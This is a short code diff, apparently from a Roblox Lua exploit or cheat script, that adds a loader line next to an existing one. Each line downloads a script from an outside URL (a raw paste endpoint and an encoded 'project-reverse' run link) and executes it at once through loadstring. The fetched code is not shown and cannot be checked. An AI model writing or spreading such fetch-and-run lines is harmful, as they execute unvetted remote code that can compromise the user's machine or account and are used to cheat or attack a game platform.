@@ -1,1 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/BnqXf5EuSy1Qk7w6/raw"))()
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjRjNzgzMTRhLWJjNTUtNDNjMC05OTQ3LTFjOWRiMzdhZmRhYiIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6ImFtZWFuZXd1aW1haW4ifX0"))()
